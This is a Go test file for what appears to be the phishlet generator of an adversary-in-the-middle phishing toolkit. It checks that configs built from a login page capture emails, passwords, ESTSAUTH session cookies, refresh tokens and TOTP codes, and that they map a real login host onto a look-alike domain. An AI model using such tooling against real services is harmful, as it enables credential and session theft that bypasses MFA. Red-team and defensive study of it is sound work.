package phishgen

import (
	"strings"
	"testing"

	"github.com/phantom-v2/phantom/core"
	"github.com/phantom-v2/phantom/core/phishlet"
	"gopkg.in/yaml.v3"
)

const sampleHTML = `<html><body>
<form action="/sess/login" method="post">
<input type="email" name="user_email">
<input type="password" name="user_pass">
<input type="hidden" name="csrf_token" value="x">
</form>
<script>document.cookie="ESTSAUTH="+t;localStorage.getItem("refresh_token");</script>
<div>Enter TOTP from authenticator</div>
</body></html>`

func TestGenerate(t *testing.T) {
	yml, err := GenerateYAML(Input{ID: "acme", Origin: "login.acme.com", Domain: "phish.test", HTML: sampleHTML})
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{"user_email", "user_pass", "ESTSAUTH", "refresh_token", "totp"} {
		if !strings.Contains(yml, want) {
			t.Fatalf("missing %s in:\n%s", want, yml)
		}
	}
	// Сгенерированный YAML обязан проходить спек и грузиться стором.
	var p core.Phishlet
	if err := yaml.Unmarshal([]byte(yml), &p); err != nil {
		t.Fatal(err)
	}
	if err := phishlet.Validate(&p); err != nil {
		t.Fatal(err)
	}
	st := phishlet.NewStore()
	got, err := st.UpsertYAML([]byte(yml))
	if err != nil {
		t.Fatal(err)
	}
	if got.ID != "acme" {
		t.Fatal("bad id")
	}
	if ph, _ := st.FindByHost("login.phish.test"); ph == nil {
		t.Fatal("not resolvable")
	}
}

func TestGenerateBare(t *testing.T) {
	yml, err := GenerateYAML(Input{ID: "bare", Origin: "a.b.corp", Domain: "x.test"})
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(yml, "passwd") || !strings.Contains(yml, "x.test") {
		t.Fatalf("bare broken:\n%s", yml)
	}
}

func TestGenerateBad(t *testing.T) {
	if _, err := GenerateYAML(Input{ID: "bad id", Origin: "x.com", Domain: "y.test"}); err == nil {
		t.Fatal("bad id must fail")
	}
	if _, err := GenerateYAML(Input{ID: "x", Origin: "localhost", Domain: "y.test"}); err == nil {
		t.Fatal("bad origin must fail")
	}
}
